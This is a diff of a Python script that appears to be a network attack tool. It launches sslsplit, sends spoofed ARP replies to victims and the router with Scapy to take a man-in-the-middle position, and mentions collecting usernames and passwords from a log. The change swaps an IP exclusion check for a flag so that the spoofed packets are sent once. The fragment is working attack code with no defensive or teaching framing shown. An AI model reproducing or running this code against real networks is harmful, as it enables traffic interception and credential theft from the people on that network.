@@ -80,12 +80,13 @@ if __name__ == "__main__":
     # execute sslplit 
     sslsplit()
 
+    sending_flag = True
     try:
         while(1):
             # send arp relies spoofing
             print(" ")
             for j in range(0,len(ip)):
-                if(ip[j]!="10.0.2.2" and ip[j]!="10.0.2.3"):
+                if(sending_flag):
                     print("Send to: ",ip[j]," ",mac[j]),
                     victimpacket = ARP( op      =  2,
                                         pdst    = ip[j],            # victim's IP
@@ -103,6 +104,7 @@ if __name__ == "__main__":
                     # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                     send(victimpacket, verbose=0)
                     send(routerpacket, verbose=0)
+                    sending_flag = False
 
             # get all username and password in log file
             print(" ")
